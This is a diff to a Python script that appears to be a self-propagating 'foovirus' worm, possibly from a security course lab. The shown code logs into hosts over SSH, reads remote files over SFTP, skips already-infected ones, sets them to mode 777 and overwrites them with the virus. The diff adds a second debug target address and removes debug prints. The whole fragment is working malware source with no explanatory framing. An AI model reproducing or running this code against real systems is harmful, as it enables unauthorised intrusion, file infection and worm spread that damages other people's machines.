@@ -62,7 +62,7 @@ def get_new_passwds(how_many):
 #                       '172.17.0.8', '172.17.0.9', '172.17.0.10', '172.17.0.11'
 
 def get_fresh_ipaddresses(how_many):
-    if debug: return ['172.17.0.2']   
+    if debug: return ['172.17.0.2', '172.17.0.3']   
                     # Provide one or more IP address that you
                     # want `attacked' for debugging purposes.
                     # The usrname and password you provided
@@ -116,13 +116,11 @@ while True:
                     virus = [line for (i,line) in enumerate(IN)]
 
                     for item in file_list:
-                        # print(f"Attacking {item}")
                         sftp = ssh.open_sftp()
                         IN = sftp.file(item, 'r')
                         # Read the contents of the remote file
                         all_of_it = IN.readlines()
                         IN.close()
-                        print(all_of_it)
                         if any('foovirus' in line for line in all_of_it): continue
                         sftp.chmod(item, 0o777)
                         OUT = sftp.file(item, 'w')
